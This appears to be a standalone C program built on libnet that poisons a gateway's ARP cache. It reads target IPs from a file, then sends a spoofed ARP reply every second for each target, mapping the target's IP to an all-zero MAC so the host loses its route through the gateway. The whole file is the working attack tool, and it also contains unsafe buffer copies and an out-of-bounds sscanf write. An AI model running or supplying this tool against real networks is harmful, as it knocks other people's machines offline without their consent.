//use these links: -lnet -lpthread

#include <libnet.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#define IP_SIZE 16 // 15 char + null

void *THREAD(void *data);
void gateway_arp_request();
void gateway_mac_check();
void arp_reply_loop(libnet_ptag_t tag_ethernet, char *target_ip_addr_str);

pthread_t thread_id[256];
u_int8_t mac_boardcast_addr[6] = {255, 255, 255, 255, 255, 255};
u_int8_t mac_z_addr[6] = {0, 0, 0, 0, 0, 0};
u_int8_t mac__gateway_addr[6];
char gateway_ip_addr_str[IP_SIZE];
char target_ip_list_str[256][IP_SIZE];
char device[10];
char file_name[15];

int main(int argc, char **argv)
{
    unsigned int list_length = 0;
    int opt = 0;

    while ((opt = getopt(argc, argv, "d:f:g:h")) != -1)
    {
        switch (opt)
        {
        case 'd':
            strcpy(device, optarg);
            break;
        case 'f':
            strcpy(file_name, optarg);
            break;
        case 'g':
            strcpy(gateway_ip_addr_str, optarg);
            break;
        case 'h':
            printf("./libnetARP -d [device] -f [filename] -g [gateway_addr] \n");
            printf("Enter -h for help\n");
            exit(1);
            break;
        default:
            exit(1);
            break;
        }
    }
    if (optind!=7)
    {
        printf("./libnetARP -d [device] -f [filename] -g [gateway_addr] \n");
        exit(1);
    } 
    FILE *list = fopen(file_name, "r");
    while (!feof(list))
    {
        fscanf(list, "%s", target_ip_list_str[list_length]);
        list_length++;
    }
    fclose(list);
    gateway_arp_request();
    gateway_mac_check();

    for (unsigned int i = 0; i < list_length; i++)
    {
        printf("%s\n", target_ip_list_str[i]);
        pthread_create(&thread_id[i], NULL, THREAD, &target_ip_list_str[i]);
    }
    pthread_join(thread_id[0], NULL);
    return 0;
}

void *THREAD(void *data)
{
    char *target_ip_addr_str = (char *)data;
    libnet_ptag_t tag_ethernet;
    tag_ethernet = 0;

    arp_reply_loop(tag_ethernet, target_ip_addr_str);
    return NULL;
}

void gateway_arp_request()
{
    libnet_t *lt;
    char errbuf[LIBNET_ERRBUF_SIZE];
    struct libnet_ether_addr *src_mac_addr;
    u_int32_t target_ip_addr, scr_ip_addr;
    int bytes;

    lt = libnet_init(LIBNET_LINK, device, errbuf);

    scr_ip_addr = libnet_get_ipaddr4(lt);
    src_mac_addr = libnet_get_hwaddr(lt);

    target_ip_addr = libnet_name2addr4(lt, gateway_ip_addr_str, LIBNET_DONT_RESOLVE);
    /*--------arp---------*/
    libnet_autobuild_arp(ARPOP_REQUEST, src_mac_addr->ether_addr_octet, (u_int8_t *)(&scr_ip_addr), mac_z_addr, (u_int8_t *)(&target_ip_addr), lt);
    /*--------eth-----------*/
    libnet_autobuild_ethernet(mac_boardcast_addr, ETHERTYPE_ARP, lt);

    bytes = libnet_write(lt);
    printf("Arp Request %d \n", bytes);
    libnet_destroy(lt);
    sleep(1);
}

void gateway_mac_check()
{
    char ipbuffer[50];
    char filebuffer[50];
    int gateway_mac_addr_check = 0;
    sprintf(ipbuffer, "(%s)", gateway_ip_addr_str);
    FILE *com = popen("/usr/sbin/arp -a", "r");
    while (!feof(com))
    {
        fscanf(com, "%s", &filebuffer);
        if (strcmp(filebuffer, ipbuffer) == 0)
        {
            fscanf(com, "%s", &filebuffer);
            fscanf(com, "%s", &filebuffer);
            gateway_mac_addr_check = 1;
            break;
        }
    }
    if (gateway_mac_addr_check == 1)
        printf("%s\n", filebuffer);
    else
    {
        printf("Mac Bulunamadi\n");
        exit(1);
    }
    pclose(com);
    sscanf(filebuffer, "%x:%x:%x:%x:%x:%x", &mac__gateway_addr[0], &mac__gateway_addr[1], &mac__gateway_addr[2], &mac__gateway_addr[3], &mac__gateway_addr[4], &mac__gateway_addr[5], &mac__gateway_addr[6]);
}

void arp_reply_loop(libnet_ptag_t tag_ethernet, char *target_ip_addr_str)
{
    libnet_t *lt;
    char errbuf[LIBNET_ERRBUF_SIZE];
    u_int32_t gateway_ip_addr, target_ip_addr;
    int bytes;

    lt = libnet_init(LIBNET_LINK, device, errbuf);
    gateway_ip_addr = libnet_name2addr4(lt, gateway_ip_addr_str, LIBNET_DONT_RESOLVE);
    target_ip_addr = libnet_name2addr4(lt, target_ip_addr_str, LIBNET_DONT_RESOLVE);

    /*---------arp---------------*/
    libnet_autobuild_arp(ARPOP_REPLY, mac_z_addr, (u_int8_t *)(&target_ip_addr), mac__gateway_addr, (u_int8_t *)(&gateway_ip_addr), lt);
    /*---------------------------*/
    /*----------eth--------------*/
    libnet_build_ethernet(mac__gateway_addr, mac_z_addr, ETHERTYPE_ARP, NULL, 0, lt, tag_ethernet);
    /*---------------------------*/
    while (1)
    {
        bytes = libnet_write(lt);
        usleep(1000000);
    }
    libnet_destroy(lt);
}
